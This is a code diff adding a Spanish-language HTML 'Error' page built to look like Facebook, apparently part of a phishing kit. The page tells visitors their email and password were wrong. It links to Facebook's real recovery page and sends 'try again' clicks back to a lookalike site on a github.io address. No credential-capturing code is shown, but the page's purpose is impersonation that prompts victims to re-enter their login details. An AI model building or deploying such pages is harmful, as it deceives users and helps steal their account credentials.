@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #3b5998; /* Color azul de Facebook */
+            color: #fff; /* Color de texto blanco */
+            font-family: 'Helvetica', sans-serif; /* Fuente similar a la usada por Facebook */
+        }
+        .error-text {
+            text-align: center;
+        }
+        .error-heading {
+            font-size: 3em;
+        }
+        .error-message {
+            font-size: 1.5em;
+            font-family: 'Arial', sans-serif; /* Fuente alternativa para el mensaje */
+            color: #ffcc00; /* Color amarillo que resalta y combina */
+        }
+        .additional-text {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .additional-text p {
+            font-size: 0.8em;
+            font-family: 'Arial', sans-serif; /* Fuente menos notable */
+            color: #ccc; /* Color de texto gris para combinar con la página de Facebook */
+            margin: 5px; /* Separación entre los textos */
+        }
+        .additional-text a {
+            color: inherit; /* Mantener el color original del enlace */
+            text-decoration: none; /* Quitar subrayado */
+            transition: color 0.3s; /* Transición de color */
+        }
+        .additional-text a:hover {
+            color: #fff; /* Cambiar color a blanco al pasar el mouse sobre el enlace */
+        }
+    </style>
+</head>
+<body>
+    <div class="error-text">
+        <h1 class="error-heading">Error</h1>
+        <p class="error-message">Sus credenciales son incorrectos, verifique su correo y contraseña e inténtelo de nuevo.</p>
+        <div class="additional-text">
+            <p><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">¿Has olvidado tu contraseña?</a></p>
+            <p><a href="https://face-reactions.github.io/web/">Regresar e intentarlo de nuevo</a></p>
+        </div>
+    </div>
+</body>
+</html>
